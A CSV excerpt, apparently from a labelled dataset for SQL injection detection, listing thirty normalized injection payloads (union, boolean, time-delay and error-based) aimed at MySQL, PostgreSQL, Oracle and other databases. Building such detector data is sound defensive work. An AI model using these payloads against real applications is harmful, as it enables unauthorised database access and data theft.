row_index,payload_norm,label,sqli_type_hint
8820,"-4745"" or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""nifq"" like ""nifq",1,
8821,"1"" ) as hymr where 5497 = 5497 union all select null,null,null,null--",1,
8822,"1', ( select ( case when ( 5217 = 5217 ) then 1 else 5217* ( select 5217 from mysql.db ) end ) )",1,
8823,"1 and elt ( 1210 = 1210,sleep ( 5 ) ) # macc",1,
8824,"1 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
8825,"1"" ) where 6128 = 6128 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1,
8826,"iif ( 9342 = 6508,1,1/0 )",1,
8827,"-5779 ) union all select 6089,6089--",1,
8828,-9721' ) or 9287 = 4362#,1,
8829,1' ) ) ) and 5934 = 2309,1,
8830,"1' ) union all select null,null,null#",1,
8831,"1' where 8437 = 8437 and make_set ( 8403 = 8403,8899 ) --",1,
8832,"1 ) ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
8833,1 ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,
8834,"-9178 where 2253 = 2253 union all select 2253,2253,2253,2253,2253,2253,2253,2253#",1,
8835,"1' ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'adjc' = 'adjc",1,
8836,"select * from generate_series ( 7754,7754,case when ( 7754 = 1252 ) then 1 else 0 end ) limit 1--",1,
8837,1 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ),1,
8838,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf' = 'osqf",1,
8839,"1' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( 'iifh' = 'iifh",1,
8840,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( 5324 = 5324",1,
8841,"1"" ) where 7753 = 7753",1,
8842,"1 ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 9841 = 9841",1,
8843,"( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select 1 from generate_series ( 9815,9815,case when ( 9815 = 9815 ) then 1 else 0 end ) limit 1 ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) )",1,
8844,"1' ) as wtfo where 5666 = 5666 union all select null,null,null,null--",1,
8845,1' ) ) and 3355 = 6012 and ( ( 'ofmy' = 'ofmy,1,
8846,"-7579%"" or 6570 = 1764",1,
8847,"elt ( 2567 = 9921,9921 )",1,
8848,-8086%' ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( '%' = ',1,
8849,"1%"" ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( ""%"" = """,1,
